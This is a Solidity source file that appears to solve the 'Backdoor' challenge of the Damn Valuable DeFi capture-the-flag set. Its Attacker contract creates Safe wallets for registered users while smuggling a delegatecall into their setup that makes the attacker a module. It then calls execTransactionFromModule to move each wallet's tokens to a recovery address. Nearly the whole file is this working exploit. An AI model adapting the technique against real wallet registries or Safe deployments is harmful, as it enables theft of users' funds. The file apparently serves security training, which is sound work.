// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {ModuleManager} from "@safe-global/safe-smart-account/contracts/base/ModuleManager.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
import {NotSafe} from "./NotSafe.sol";

contract Attacker {

    SafeProxyFactory walletFactory;
    Safe singletonCopy; 
    WalletRegistry walletRegistry; 
    address[] users; 
    address recovery; 
    DamnValuableToken token;

    constructor(SafeProxyFactory _walletFactory, Safe _singletonCopy, WalletRegistry _walletRegistry, 
    address[] memory _users, address _recovery, DamnValuableToken _token) {
        
        walletFactory = _walletFactory;
        singletonCopy = _singletonCopy;
        walletRegistry = _walletRegistry;

        for (uint256 i = 0; i < _users.length; i++) {
            users.push(_users[i]);
        }

        recovery = _recovery;
        token = _token;

    }

    function attack() external {
        bytes[] memory initializers = new bytes[](4);
        NotSafe notSafe = new NotSafe();
        for (uint256 i = 0; i < 4; i++) {
            address[] memory user = new address[](1);
            user[0] = users[i]; 
            initializers[i] = abi.encodeCall(Safe.setup, (user, 1, address(notSafe), abi.encodeCall(NotSafe.addModuleManager, address(this)), address(0), address(0), 0, payable(address(0))));
            walletFactory.createProxyWithCallback(address(singletonCopy), initializers[i], i, walletRegistry);
            // bytes memory exec = abi.encodeCall(token.transfer, (player, 0, abi.encodeCall(token.transfer, (player, 10)), Enum.Operation.Call));
            bytes memory exec = abi.encodeCall(ModuleManager.execTransactionFromModule, (address(token), 0, abi.encodeCall(token.transfer, (recovery, 10e18)), Enum.Operation.Call));
            (bool success,) = walletRegistry.wallets(users[i]).call(exec);
            if (!success) {revert("failed");}
        }
    }
    receive() external payable {}
    fallback() external payable {}
    
}
